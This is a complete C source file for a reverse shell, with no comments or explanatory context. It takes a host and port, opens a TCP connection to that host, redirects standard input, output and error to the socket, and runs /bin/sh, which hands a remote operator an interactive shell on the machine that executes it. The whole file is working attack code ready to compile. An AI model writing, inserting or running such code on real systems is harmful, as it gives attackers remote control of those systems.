#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#include <err.h>
#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

int
main(int argc, char **argv)
{
	char			*exec_argv[] = { "/bin/sh", NULL };
	char			*endptr;
	int			 fd;
	long			 port;
	struct sockaddr_in	 sa;

	if (argc == 1)
		errx(1, "usage: host port");

	errno = 0;
	port = strtol(argv[2], &endptr, 10);
	if (*endptr != '\0')
		errx(1, "not a number");
	if (errno == ERANGE || (port <= 1024 || port >= 65536))
		errx(1, "port out of range");

	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		err(1, "socket");

	bzero(&sa, sizeof sa);
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(argv[1]);
	sa.sin_port = htons(port);

	if (connect(fd, (struct sockaddr *) &sa, sizeof sa) == -1)
		err(1, "connect");

	if (dup2(fd, STDIN_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd, STDOUT_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd, STDERR_FILENO) == -1)
		err(1, "dup2");

	execve(exec_argv[0], exec_argv, NULL);
	err(1, "execve");

	return (0);	/* NOTREACHED */
}
